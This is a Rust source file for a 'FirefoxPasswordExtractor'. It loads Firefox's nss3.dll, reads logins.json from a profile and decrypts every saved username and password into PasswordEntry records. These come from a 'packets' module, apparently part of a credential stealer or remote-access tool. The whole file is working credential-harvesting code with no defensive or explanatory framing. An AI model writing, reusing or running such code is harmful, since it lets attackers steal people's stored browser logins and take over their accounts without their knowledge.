use std::path::Path;
use std::ffi::CString;
use common::packets::PasswordEntry;

// NSS FFI bindings for Firefox password decryption
// These functions are exported by nss3.dll

#[repr(C)]
struct SECItem {
    sec_item_type: u32,
    data: *mut u8,
    len: u32,
}

type NSSInitFunc = unsafe extern "C" fn(configdir: *const i8) -> i32;
type PK11SDRDecryptFunc = unsafe extern "C" fn(data: *const SECItem, result: *mut SECItem, cx: *mut std::ffi::c_void) -> i32;
type PORTFreeFunc = unsafe extern "C" fn(ptr: *mut std::ffi::c_void);

pub struct FirefoxPasswordExtractor {
    nss_initialized: bool,
}

impl FirefoxPasswordExtractor {
    pub fn new() -> Self {
        Self {
            nss_initialized: false,
        }
    }

    pub fn init_nss(&mut self, profile_path: &Path) -> bool {
        if self.nss_initialized {
            return true;
        }

        // Try to load NSS library dynamically
        match unsafe { libloading::Library::new("nss3.dll") } {
            Ok(nss_lib) => {
                println!("[Firefox] Loaded nss3.dll successfully");
                
                // Get required function pointers
                let nss_init: libloading::Symbol<NSSInitFunc> = match unsafe { nss_lib.get(b"NSS_Init") } {
                    Ok(f) => f,
                    Err(e) => {
                        println!("[Firefox] Failed to get NSS_Init: {}", e);
                        return false;
                    }
                };

                // Convert path to C string
                let path_cstr = match CString::new(profile_path.to_str().unwrap_or("")) {
                    Ok(s) => s,
                    Err(e) => {
                        println!("[Firefox] Invalid profile path: {}", e);
                        return false;
                    }
                };

                // Initialize NSS in read-only mode
                let result = unsafe { nss_init(path_cstr.as_ptr()) };
                if result == 0 {
                    println!("[Firefox] NSS initialized successfully for {:?}", profile_path);
                    self.nss_initialized = true;
                    true
                } else {
                    println!("[Firefox] NSS_Init failed with code: {}", result);
                    false
                }
            }
            Err(e) => {
                println!("[Firefox] Failed to load nss3.dll: {}", e);
                false
            }
        }
    }

    pub fn decrypt_data(&self, encrypted_b64: &str) -> Option<String> {
        if !self.nss_initialized {
            return None;
        }

        // Decode base64 encrypted data
        let encrypted_data = match base64::Engine::decode(&base64::engine::general_purpose::STANDARD, encrypted_b64) {
            Ok(d) => d,
            Err(e) => {
                println!("[Firefox] Failed to decode base64: {}", e);
                return None;
            }
        };

        // Create input SECItem
        let mut input = SECItem {
            sec_item_type: 0,
            data: encrypted_data.as_ptr() as *mut u8,
            len: encrypted_data.len() as u32,
        };

        // Create output SECItem (will be allocated by NSS)
        let mut output = SECItem {
            sec_item_type: 0,
            data: std::ptr::null_mut(),
            len: 0,
        };

        // Load PK11SDR_Decrypt function
        unsafe {
            let nss_lib = match libloading::Library::new("nss3.dll") {
                Ok(lib) => lib,
                Err(e) => {
                    println!("[Firefox] Failed to reload nss3.dll for decrypt: {}", e);
                    return None;
                }
            };

            let pk11_sdr_decrypt: libloading::Symbol<PK11SDRDecryptFunc> = match nss_lib.get(b"PK11SDR_Decrypt") {
                Ok(f) => f,
                Err(e) => {
                    println!("[Firefox] Failed to get PK11SDR_Decrypt: {}", e);
                    return None;
                }
            };

            let port_free: libloading::Symbol<PORTFreeFunc> = match nss_lib.get(b"PORT_Free") {
                Ok(f) => f,
                Err(e) => {
                    println!("[Firefox] Failed to get PORT_Free: {}", e);
                    return None;
                }
            };

            // Call PK11SDR_Decrypt
            let result = pk11_sdr_decrypt(&input, &mut output, std::ptr::null_mut());
            if result != 0 {
                println!("[Firefox] PK11SDR_Decrypt failed with code: {}", result);
                return None;
            }

            // Extract decrypted data
            if output.data.is_null() || output.len == 0 {
                println!("[Firefox] Decryption returned empty data");
                return None;
            }

            let decrypted = std::slice::from_raw_parts(output.data, output.len as usize).to_vec();
            
            // Free the allocated memory
            port_free(output.data as *mut std::ffi::c_void);

            // Convert to string
            String::from_utf8(decrypted).ok()
        }
    }

    pub fn extract_passwords_from_logins(&self, profile_path: &Path) -> Vec<PasswordEntry> {
        let logins_path = profile_path.join("logins.json");
        if !logins_path.exists() {
            println!("[Firefox] logins.json not found at {:?}", logins_path);
            return Vec::new();
        }

        println!("[Firefox] Reading logins.json from {:?}", logins_path);
        
        // Read and parse logins.json
        let content = match std::fs::read_to_string(&logins_path) {
            Ok(c) => c,
            Err(e) => {
                println!("[Firefox] Failed to read logins.json: {}", e);
                return Vec::new();
            }
        };

        let json: serde_json::Value = match serde_json::from_str(&content) {
            Ok(j) => j,
            Err(e) => {
                println!("[Firefox] Failed to parse logins.json: {}", e);
                return Vec::new();
            }
        };

        let mut passwords = Vec::new();
        
        if let Some(logins) = json["logins"].as_array() {
            println!("[Firefox] Found {} login entries in logins.json", logins.len());
            
            for login in logins {
                let hostname = login["hostname"].as_str().unwrap_or("");
                let username_enc = login["encryptedUsername"].as_str().unwrap_or("");
                let password_enc = login["encryptedPassword"].as_str().unwrap_or("");

                if hostname.is_empty() || username_enc.is_empty() || password_enc.is_empty() {
                    continue;
                }

                // Try to decrypt username and password
                if let Some(decrypted_pass) = self.decrypt_data(password_enc) {
                    if let Some(decrypted_user) = self.decrypt_data(username_enc) {
                        passwords.push(PasswordEntry {
                            url: hostname.to_string(),
                            username: decrypted_user,
                            password: decrypted_pass,
                        });
                    }
                }
            }
        }

        println!("[Firefox] Extracted {} passwords from logins.json", passwords.len());
        passwords
    }
}
